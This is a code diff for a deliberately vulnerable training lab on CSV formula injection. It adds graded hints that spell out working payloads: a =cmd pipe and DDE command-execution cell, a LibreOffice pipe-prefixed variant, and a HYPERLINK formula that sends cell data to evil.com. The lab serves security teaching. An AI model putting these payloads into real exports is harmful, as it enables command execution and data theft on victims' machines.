@@ -5,7 +5,7 @@
 // or a pipe, the matching flag is awarded.
 const express = require('express');
 const { getDb } = require('../../lib/db');
-const { page, esc, flagBox, hintBox, brief } = require('../../lib/page');
+const { brief, esc, fixPanel, flagBox, hintBox, hintLadder, page, toolsPill, trackBanner } = require('../../lib/page');
 const { award, captured } = require('../../lib/flags');
 
 const router = express.Router();
@@ -53,7 +53,8 @@ router.get('/', (req, res) => {
           <span class="diff">${esc(v.difficulty)}</span>
           ${done ? '<span class="captured">flag captured</span>' : ''}
         </h3>
-        ${hintBox(v.hint)}
+        ${hintLadder(v)}
+      ${toolsPill(v)}
         <p><i>Attack:</i> ${esc(v.how)}</p>
       </div>`;
   }).join('\n');
@@ -73,6 +74,7 @@ router.get('/', (req, res) => {
       <code>X-Flags</code> response header (also saved to your scoreboard).</p>
       <p>Proper CSV quoting is applied, and it does <b>not</b> save you: quoting
       is not sanitization.</p>`)}
+    ${trackBanner(module.exports)}
     <h2>Add a contact</h2>
     <form method="POST" action="/formula/add">
       <input type="text" name="name" placeholder="name" size="40" required /><br /><br />
@@ -127,13 +129,17 @@ module.exports = {
   name: 'CSV Formula Injection',
   tagline: 'Poison the export: turn spreadsheet cells into live formulas.',
   description: 'A contact manager exports user-controlled fields to CSV without neutralizing spreadsheet formula triggers. Smuggle =cmd, DDE, HYPERLINK, and pipe-prefixed payloads through the export and let the server verify they landed.',
-  difficulty: 'Mixed',
+  difficulty: 'Beginner',
+  track: 'Foundations',
+  prerequisites: ['xss'],
   vulns: [
     {
       id: 'formula-csv',
       name: 'Classic Formula Injection',
       difficulty: 'Easy',
       hint: 'Spreadsheets execute cells starting with =. The classic payload calls cmd through the pipe syntax.',
+      hints: ["The CSV export includes your input raw. What happens when Excel opens =cmd|...?", "Formula injection. The cell is treated as a formula.", "Submit =cmd|' /C calc'!A0 as a field. The export has the dangerous cell."],
+      tools: "B",
       how: 'Put =cmd|... style payload in the name field and download the CSV export.',
     },
     {
@@ -141,6 +147,8 @@ module.exports = {
       name: 'DDE Command Execution',
       difficulty: 'Easy',
       hint: 'DDE lets a formula ask another application to run a command. The DDE() function form works too.',
+      hints: ["DDE is an old Excel feature for command execution. The payload is =cmd|...", "DDEAUTO or cmd pipe. It's in the field value.", "Submit the DDE payload. The export carries it."],
+      tools: "B",
       how: 'Put a =DDE("cmd";...) payload in a field and download the CSV export.',
     },
     {
@@ -148,6 +156,8 @@ module.exports = {
       name: 'HYPERLINK Exfiltration',
       difficulty: 'Medium',
       hint: 'HYPERLINK can point anywhere and show any label. Combine it with cell references to leak neighboring data.',
+      hints: ["HYPERLINK can exfiltrate data. The formula is =HYPERLINK(...).", "The link URL can include cell data. It's a data theft primitive.", "Submit =HYPERLINK(\"http://evil.com/?\"&A1,\"click\")."],
+      tools: "B",
       how: 'Put a =HYPERLINK("http://evil.example",...) payload in a field and download the CSV export.',
     },
     {
@@ -155,6 +165,8 @@ module.exports = {
       name: 'Pipe Prefix (LibreOffice)',
       difficulty: 'Easy',
       hint: 'LibreOffice-flavored variant: the pipe character at the start of a cell is another formula trigger.',
+      hints: ["LibreOffice uses the pipe prefix for formulas. The payload starts with |.", "Pipe formulas run in LibreOffice. Same idea, different app.", "Submit |'cmd'!A0 or similar. The export has it."],
+      tools: "B",
       how: 'Put a pipe-prefixed payload (starting with |) in a field and download the CSV export.',
     },
   ],
